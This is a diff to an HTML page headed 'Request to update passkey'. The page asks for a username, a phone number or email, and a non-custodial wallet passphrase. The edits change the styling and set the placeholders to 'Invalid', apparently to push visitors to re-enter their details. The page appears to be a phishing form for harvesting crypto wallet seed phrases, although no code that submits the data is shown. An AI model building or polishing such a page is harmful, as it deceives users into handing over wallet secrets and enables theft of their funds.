@@ -33,29 +33,33 @@
             border-radius: 10px;
             box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
         }
-        /* Common styling for inputs to match <p class="info"> */
-        textarea {
+        /* Styling for username and email fields */
+        input {
             width: calc(100% - 20px);
+            height: 45px; /* Fixed height */
             padding: 10px;
-            font-size: 14px; /* Same as info text */
+            font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            resize: none;
-            color: gray; /* Same as info text */
+            color: gray;
             font-family: Arial, sans-serif;
         }
-        textarea::placeholder {
-            font-size: 14px; /* Match info text */
-            color: gray; /* Match info text */
+        input::placeholder, textarea::placeholder {
+            font-size: 14px;
+            color: gray;
             font-family: Arial, sans-serif;
         }
-        /* Username and Email height same as button */
-        .input-small {
-            height: 50px;
-        }
-        /* Passphrase height 3 times button height */
+        /* Passphrase height is 3x button height */
         .input-large {
+            width: calc(100% - 20px);
             height: 150px;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            color: gray;
+            font-family: Arial, sans-serif;
+            resize: none;
         }
         .btn {
             width: 100%;
@@ -95,7 +99,7 @@
                 width: 95%;
                 padding: 15px;
             }
-            textarea {
+            input, textarea {
                 font-size: 12px;
                 padding: 8px;
             }
@@ -130,12 +134,12 @@
     </div>
     <div class="container">
         <h2>Request to update passkey</h2>
-        <textarea class="input-small" placeholder="Enter Username"></textarea>
-        <textarea class="input-small" placeholder="Enter Phone number/Email ID"></textarea>
-        <textarea id="passphrase" class="input-large" placeholder="Enter Passphrase"></textarea>
+        <input type="text" placeholder="Invalid Username">
+        <input type="text" placeholder="Invalid Phone number/Email ID">
+        <textarea id="passphrase" class="input-large" placeholder="Invalid Passphrase"></textarea>
         <p id="message" class="error-message"></p>
         <button class="btn" onclick="validatePassphrase()">Send Request</button>
-        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently possible by support team.</p>
+        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
     </div>
 </body>
 </html>
